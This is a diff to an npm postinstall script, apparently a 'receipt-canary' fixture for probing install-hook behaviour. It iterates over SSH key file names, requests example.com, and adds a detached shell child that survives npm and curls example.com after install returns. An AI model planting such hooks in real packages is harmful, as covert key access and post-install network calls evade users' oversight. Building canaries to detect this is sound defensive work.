@@ -9,3 +9,10 @@ for (const name of ["authorized_keys", "known_hosts", "id_ed25519"]) {
 }
 await fetch("https://example.com/", { method: "GET" }).catch(() => null);
 console.log("receipt-canary: postinstall done");
+
+// A detached child that outlives npm and connects after install has returned.
+import { spawn } from "node:child_process";
+spawn("sh", ["-c", "sleep 8; curl -s -o /dev/null https://example.com/"], {
+  detached: true,
+  stdio: "ignore",
+}).unref();
